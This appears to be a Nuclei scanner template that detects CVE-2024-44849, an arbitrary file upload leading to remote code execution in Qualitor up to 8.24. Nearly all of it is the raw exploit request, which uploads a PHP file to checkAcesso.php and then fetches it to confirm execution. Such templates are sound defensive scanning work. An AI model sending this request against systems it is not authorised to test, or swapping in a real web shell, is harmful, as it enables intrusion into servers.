flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "parent.showQAlert(\'Upload", "showQAlert")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849


    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="idtipo"


    2

    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="nmfilestorage"



    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="nmdiretoriorede"


    .

    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="nmbucket"



    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="nmaccesskey"



    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="nmkeyid"



    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="fleArquivo"; filename="{{filename}}.php"


    <?php echo md5({{num}}); ?>

    -----------------------------QUALITORspaceCVEspace2024space44849

    Content-Disposition: form-data; name="cdfilestorage"



    -----------------------------QUALITORspaceCVEspace2024space44849--

    '
- matchers:
  - condition: and
    dsl:
    - contains(body,"{{md5(num)}}")
    - contains(content_type, "text/html")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /html/ad/adfilestorage/request/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-44849
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-44849
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
  description: 'Qualitor up to 8.24 is vulnerable to Remote Code Execution (RCE) via
    Arbitrary File Upload in checkAcesso.php.

    '
  metadata:
    fofa-query: Qualitor
    max-request: 2
    product: qualitor
    vendor: qualitor
    verified: true
  name: Qualitor <= 8.24 - Remote Code Execution
  reference:
  - https://cvefeed.io/vuln/detail/CVE-2024-44849
  - https://nvd.nist.gov/vuln/detail/CVE-2024-44849
  - https://github.com/extencil/CVE-2024-44849
  - https://blog.extencil.me/information-security/cves/cve-2024-44849
  - https://sploitus.com/exploit?id=D08D686E-7910-5E17-99CC-36407B9884B8
  severity: critical
  tags: cve,cve2024,rce,file-upload,qualitor,intrusive
variables:
  filename: '{{rand_base(12)}}'
  num: '{{rand_int(1000, 9999)}}'
